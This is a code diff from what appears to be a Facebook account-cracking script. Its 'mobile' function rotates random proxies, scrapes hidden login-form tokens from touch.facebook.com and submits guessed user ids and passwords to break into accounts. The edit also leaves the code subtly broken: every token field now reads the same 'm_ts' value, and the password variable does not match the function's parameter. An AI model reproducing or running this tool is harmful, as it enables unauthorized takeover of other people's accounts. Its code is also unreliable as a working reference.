@@ -1600,15 +1600,15 @@ def mobile(uid,pwx,tl):
             nip=random.choice(xvx)
             proxs= {'http': nip}
             Session = requests.Session()
-            free_fb = Session.get('https://touch.facebook.com/')
+            free_fb = Session.get('https://touch.facebook.com/').text
             data ={
-'lsd': re.search('name="lsd" value="(.*?)"',str(free_fb.text)).group(1),
-'jazoest': re.search('name="jazoest" value="(.*?)"',str(free_fb.text)).group(1),
-'m_ts': re.search('name="m_ts" value="(.*?)"',str(free_fb.text)).group(1),
-'li': re.search('name="li" value="(.*?)"',str(free_fb.text)).group(1),
+'lsd': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+'jazoest': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+'li': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
 'try_number': 0,
 'unrecognized_tries': 0,
-'email':idf,
+'email':uid,
 'pass':pw,
 'login':'Masuk',
 'prefill_contact_point': '',
